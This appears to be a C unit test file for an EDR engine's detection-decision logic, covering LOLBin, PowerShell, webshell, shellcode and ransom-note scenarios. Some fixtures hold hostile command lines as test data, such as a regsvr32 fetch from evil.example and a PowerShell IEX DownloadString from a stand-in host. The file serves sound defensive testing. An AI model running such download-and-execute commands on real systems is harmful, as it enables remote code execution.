#include "edr/detection_decision.h"

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void init(EdrBehaviorRecord *r) {
  memset(r, 0, sizeof(*r));
  r->type = EDR_EVENT_PROCESS_CREATE;
  r->priority = 1u;
}

static void test_setenv(const char *k, const char *v) {
#ifdef _WIN32
  _putenv_s(k, v);
#else
  setenv(k, v, 1);
#endif
}

static void test_unsetenv(const char *k) {
#ifdef _WIN32
  _putenv_s(k, "");
#else
  unsetenv(k);
#endif
}

static void test_regsvr32_remote_combo_high(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  snprintf(r.process_name, sizeof(r.process_name), "%s", "regsvr32.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Windows\\System32\\regsvr32.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s", "regsvr32.exe /s /n /u /i:https://evil.example/a.sct scrobj.dll");
  snprintf(r.parent_name, sizeof(r.parent_name), "%s", "explorer.exe");
  edr_detection_decision_evaluate(&r, &d);
  assert(!d.drop);
  assert(!d.suppress);
  assert(d.confidence >= 0.70f);
  assert(strstr(r.detection_context, "\"remote\":true") != NULL);
  assert(strstr(r.detection_context, "\"signed\":null") != NULL);
  assert(strstr(r.detection_context, "\"signature_trust\"") != NULL);
  assert(strstr(r.detection_context, "\"detection_profile\"") != NULL);
  assert(strstr(r.detection_context, "\"detection_trigger\"") != NULL);
  assert(strstr(r.detection_context, "\"recommended_forensics\"") != NULL);
  assert(d.trigger_pmfe_scan);
  assert(!d.trigger_single_process_minidump);
  assert(strstr(r.detection_context, "\"pmfe_scan\"") != NULL);
  assert(strstr(r.detection_context, "stream_forensic_combo") != NULL);
}

static void test_regsvr32_without_combo_suppressed(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  snprintf(r.process_name, sizeof(r.process_name), "%s", "regsvr32.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Windows\\System32\\regsvr32.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s", "regsvr32.exe normal.dll");
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(d.confidence <= 0.32f);
  assert(strstr(d.reason, "lolbin_without_combo_condition") != NULL);
  assert(strstr(r.detection_context, "\"suppression\"") != NULL);
  assert(strstr(r.detection_context, "\"confidence_before\"") != NULL);
}

static void test_management_tool_in_enterprise_path_downgrades(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  snprintf(r.process_name, sizeof(r.process_name), "%s", "TeamViewer.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Program Files\\TeamViewer\\TeamViewer.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s", "TeamViewer.exe --service");
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(d.confidence < 0.25f);
  assert(d.drop);
}

static void test_shellcode_recommends_minidump_and_pmfe(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.type = EDR_EVENT_PROTOCOL_SHELLCODE;
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s", "detector=yara rule=EternalBlue score=1.0 proto=smb2");
  edr_detection_decision_evaluate(&r, &d);
  assert(!d.drop);
  assert(d.trigger_pmfe_scan);
  assert(!d.trigger_single_process_minidump);
  assert(strstr(r.detection_context, "\"engine\":\"shellcode\"") != NULL);
  assert(strstr(r.detection_context, "\"engine_evidence\"") != NULL);
  assert(strstr(r.detection_context, "\"detector\":\"yara\"") != NULL);
  assert(strstr(r.detection_context, "\"rule\":\"EternalBlue\"") != NULL);
  assert(strstr(r.detection_context, "\"proto\":\"smb2\"") != NULL);
  assert(strstr(r.detection_context, "shellcode_high_signal") != NULL);
}

static void test_webshell_triggers_targeted_pmfe(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.type = EDR_EVENT_WEBSHELL_DETECTED;
  snprintf(r.file_path, sizeof(r.file_path), "%s", "/var/www/html/upload/shell.php");
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s",
           "detector=yara rule=PHP_Webshell_Eval score=0.91 proto=http mitre=T1505.003");
  edr_detection_decision_evaluate(&r, &d);
  assert(!d.drop);
  assert(d.trigger_pmfe_scan);
  assert(strstr(r.detection_context, "\"engine\":\"webshell\"") != NULL);
  assert(strstr(r.detection_context, "\"webshell_files\"") != NULL);
  assert(strstr(r.detection_context, "\"targeted_files\":true") != NULL);
  assert(strstr(r.detection_context, "\"rule\":\"PHP_Webshell_Eval\"") != NULL);
  assert(strstr(r.detection_context, "webshell_high_signal") != NULL);
}

static void test_pmfe_result_keeps_memory_evidence(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  r.type = EDR_EVENT_PMFE_SCAN_RESULT;
  snprintf(r.pmfe_snapshot, sizeof(r.pmfe_snapshot), "%s", "{\"ave\":0.77,\"mz\":1,\"stomp\":0}");
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s", "detector=pmfe score=0.77 mitre=T1055");
  edr_detection_decision_evaluate(&r, &d);
  assert(!d.drop);
  assert(!d.trigger_pmfe_scan);
  assert(strstr(r.detection_context, "\"engine\":\"pmfe\"") != NULL);
  assert(strstr(r.detection_context, "\"pmfe_snapshot\"") != NULL);
  assert(strstr(r.detection_context, "\"detector\":\"pmfe\"") != NULL);
  assert(strstr(r.detection_context, "pmfe_result_feedback") != NULL);
}

static void test_rmm_enterprise_allowlist_policy_suppresses_remote_noise(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  test_setenv("EDR_DETECTION_RMM_ALLOWLIST", "ScreenConnect.ClientService.exe,C:\\Program Files\\ScreenConnect\\");
  test_setenv("EDR_DETECTION_RMM_POLICY_VERSION", "tenant-demo-rmm-v1");
  test_setenv("EDR_DETECTION_RMM_ROLLBACK_VERSION", "tenant-demo-rmm-v0");
  snprintf(r.process_name, sizeof(r.process_name), "%s", "ScreenConnect.ClientService.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Program Files\\ScreenConnect\\ClientService.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s", "ScreenConnect.ClientService.exe --service");
  snprintf(r.net_dst, sizeof(r.net_dst), "%s", "198.51.100.9");
  r.net_dport = 443u;
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(strstr(d.reason, "rmm_enterprise_allowlist_policy") != NULL);
  assert(strstr(r.detection_context, "\"rmm_policy_match\":true") != NULL);
  assert(strstr(r.detection_context, "\"suppression\"") != NULL);
  assert(strstr(r.detection_context, "\"reason\":\"rmm_enterprise_allowlist_policy\"") != NULL);
  assert(strstr(r.detection_context, "\"confidence_after\"") != NULL);
  assert(strstr(r.detection_context, "tenant-demo-rmm-v1") != NULL);
  assert(strstr(r.detection_context, "\"hit_count\":") != NULL);
  assert(strstr(r.detection_context, "\"rollback_available\":true") != NULL);
  assert(strstr(r.detection_context, "tenant-demo-rmm-v0") != NULL);
  test_unsetenv("EDR_DETECTION_RMM_ALLOWLIST");
  test_unsetenv("EDR_DETECTION_RMM_POLICY_VERSION");
  test_unsetenv("EDR_DETECTION_RMM_ROLLBACK_VERSION");
}

static void test_process_context_window_correlates_remote_script(void) {
  EdrBehaviorRecord r1;
  EdrBehaviorRecord r2;
  EdrDetectionDecision d;
  init(&r1);
  r1.type = EDR_EVENT_NET_CONNECT;
  r1.pid = 9901u;
  r1.event_time_ns = 1779338600000000000LL;
  snprintf(r1.process_name, sizeof(r1.process_name), "%s", "powershell.exe");
  snprintf(r1.net_dst, sizeof(r1.net_dst), "%s", "203.0.113.77");
  r1.net_dport = 443u;
  edr_detection_decision_evaluate(&r1, &d);

  init(&r2);
  r2.type = EDR_EVENT_SCRIPT_POWERSHELL;
  r2.pid = 9901u;
  r2.event_time_ns = 1779338605000000000LL;
  snprintf(r2.process_name, sizeof(r2.process_name), "%s", "powershell.exe");
  snprintf(r2.cmdline, sizeof(r2.cmdline), "%s", "powershell.exe -nop -enc SQBFAFgA");
  snprintf(r2.script_snippet, sizeof(r2.script_snippet), "%s",
           "sensor=scriptblock script_content=IEX_DownloadString");
  edr_detection_decision_evaluate(&r2, &d);
  assert(!d.drop);
  assert(d.context_correlated);
  assert(d.confidence >= 0.70f);
  assert(d.trigger_pmfe_scan);
  assert(strstr(d.reason, "process_window_remote_script") != NULL);
  assert(strstr(r2.detection_context, "\"process_context\":true") != NULL);
}

static void test_process_tree_context_correlates_parent_child(void) {
  EdrBehaviorRecord parent;
  EdrBehaviorRecord child;
  EdrDetectionDecision d;
  init(&parent);
  parent.type = EDR_EVENT_SCRIPT_POWERSHELL;
  parent.pid = 9902u;
  parent.event_time_ns = 1779338610000000000LL;
  snprintf(parent.process_name, sizeof(parent.process_name), "%s", "powershell.exe");
  snprintf(parent.cmdline, sizeof(parent.cmdline), "%s", "powershell.exe -nop IEX DownloadString('https://evil/a.ps1')");
  snprintf(parent.script_snippet, sizeof(parent.script_snippet), "%s", "sensor=scriptblock script_content=IEX_DownloadString");
  edr_detection_decision_evaluate(&parent, &d);

  init(&child);
  child.type = EDR_EVENT_PROCESS_CREATE;
  child.pid = 9903u;
  child.ppid = 9902u;
  child.event_time_ns = 1779338615000000000LL;
  snprintf(child.process_name, sizeof(child.process_name), "%s", "regsvr32.exe");
  snprintf(child.exe_path, sizeof(child.exe_path), "%s", "C:\\Windows\\System32\\regsvr32.exe");
  snprintf(child.cmdline, sizeof(child.cmdline), "%s", "regsvr32.exe normal.dll");
  edr_detection_decision_evaluate(&child, &d);
  assert(!d.drop);
  assert(!d.suppress);
  assert(d.context_correlated);
  assert(d.confidence >= 0.55f);
  assert(d.trigger_pmfe_scan);
  assert(strstr(d.reason, "process_tree_parent_remote_script") != NULL);
  assert(strstr(child.detection_context, "\"process_context\":true") != NULL);
  assert(strstr(child.detection_context, "process_context_high_signal") != NULL);
}

static void test_file_policy_allowlist_suppresses_known_rmm(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  const char *path = "/private/tmp/edr_detection_rmm_allowlist.txt";
  FILE *f = fopen(path, "wb");
  assert(f != NULL);
  fputs("ScreenConnect.ClientService.exe\nC:\\Program Files\\ScreenConnect\\\n", f);
  fclose(f);
  test_setenv("EDR_DETECTION_RMM_ALLOWLIST_FILE", path);
  test_setenv("EDR_DETECTION_RMM_POLICY_VERSION", "tenant-demo-rmm-file-v1");
  init(&r);
  snprintf(r.process_name, sizeof(r.process_name), "%s", "ScreenConnect.ClientService.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Program Files\\ScreenConnect\\ClientService.exe");
  snprintf(r.net_dst, sizeof(r.net_dst), "%s", "198.51.100.9");
  r.net_dport = 443u;
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(strstr(d.reason, "rmm_enterprise_allowlist_policy") != NULL);
  assert(strstr(r.detection_context, "\"suppression\"") != NULL);
  assert(strstr(r.detection_context, "tenant-demo-rmm-file-v1") != NULL);
  test_unsetenv("EDR_DETECTION_RMM_ALLOWLIST_FILE");
  test_unsetenv("EDR_DETECTION_RMM_POLICY_VERSION");
  remove(path);
}

static void test_false_positive_feedback_policy_suppresses_known_tool(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  test_setenv("EDR_DETECTION_FP_FEEDBACK", "AcmeBackup.exe,C:\\Program Files\\AcmeBackup\\");
  test_setenv("EDR_DETECTION_FP_POLICY_VERSION", "tenant-fp-v3");
  test_setenv("EDR_DETECTION_FP_ROLLBACK_VERSION", "tenant-fp-v2");
  snprintf(r.process_name, sizeof(r.process_name), "%s", "AcmeBackup.exe");
  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Program Files\\AcmeBackup\\AcmeBackup.exe");
  snprintf(r.cmdline, sizeof(r.cmdline), "%s", "AcmeBackup.exe --sync");
  edr_detection_decision_evaluate(&r, &d);
  assert(d.suppress);
  assert(d.drop);
  assert(strstr(d.reason, "false_positive_feedback_policy") != NULL);
  assert(strstr(r.detection_context, "\"false_positive_feedback\":true") != NULL);
  assert(strstr(r.detection_context, "\"reason\":\"false_positive_feedback_policy\"") != NULL);
  assert(strstr(r.detection_context, "tenant-fp-v3") != NULL);
  assert(strstr(r.detection_context, "tenant-fp-v2") != NULL);
  assert(strstr(r.detection_context, "\"hit_count\":") != NULL);
  test_unsetenv("EDR_DETECTION_FP_FEEDBACK");
  test_unsetenv("EDR_DETECTION_FP_POLICY_VERSION");
  test_unsetenv("EDR_DETECTION_FP_ROLLBACK_VERSION");
}

static void test_ransom_control_threshold_context(void) {
  EdrBehaviorRecord r;
  EdrDetectionDecision d;
  init(&r);
  test_setenv("EDR_RANSOM_CHAIN_CANDIDATE_SCORE", "45");
  test_setenv("EDR_RANSOM_CHAIN_P0_SCORE", "65");
  test_setenv("EDR_RANSOM_NOTE_MIN_FILES", "3");
  test_setenv("EDR_RANSOM_NOTE_WINDOW_S", "600");
  r.type = EDR_EVENT_FILE_WRITE;
  r.pid = 9910u;
  snprintf(r.process_name, sizeof(r.process_name), "%s", "sync_update.exe");
  snprintf(r.file_path, sizeof(r.file_path), "%s", "C:\\Users\\alice\\Documents\\HOW_TO_RESTORE.txt");
  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s",
           "ransom_note_count=3 ransom_note_burst=1");
  edr_detection_decision_evaluate(&r, &d);
  assert(!d.drop);
  assert(strstr(d.reason, "ransom_note_burst") != NULL);
  assert(strstr(r.detection_context, "\"ransom_control\"") != NULL);
  assert(strstr(r.detection_context, "\"version\":\"ransom-control-v2\"") != NULL);
  assert(strstr(r.detection_context, "\"note_count\":3") != NULL);
  assert(strstr(r.detection_context, "\"note_min_files\":3") != NULL);
  assert(strstr(r.detection_context, "\"note_window_s\":600") != NULL);
  assert(strstr(r.detection_context, "\"candidate_score\":45") != NULL);
  assert(strstr(r.detection_context, "\"p0_score\":65") != NULL);
  assert(strstr(r.detection_context, "\"direct_emit_single_note\":false") != NULL);
  test_unsetenv("EDR_RANSOM_CHAIN_CANDIDATE_SCORE");
  test_unsetenv("EDR_RANSOM_CHAIN_P0_SCORE");
  test_unsetenv("EDR_RANSOM_NOTE_MIN_FILES");
  test_unsetenv("EDR_RANSOM_NOTE_WINDOW_S");
}

int main(void) {
  test_regsvr32_remote_combo_high();
  test_regsvr32_without_combo_suppressed();
  test_management_tool_in_enterprise_path_downgrades();
  test_shellcode_recommends_minidump_and_pmfe();
  test_webshell_triggers_targeted_pmfe();
  test_pmfe_result_keeps_memory_evidence();
  test_rmm_enterprise_allowlist_policy_suppresses_remote_noise();
  test_process_context_window_correlates_remote_script();
  test_process_tree_context_correlates_parent_child();
  test_file_policy_allowlist_suppresses_known_rmm();
  test_false_positive_feedback_policy_suppresses_known_tool();
  test_ransom_control_threshold_context();
  puts("detection_decision ok");
  return 0;
}
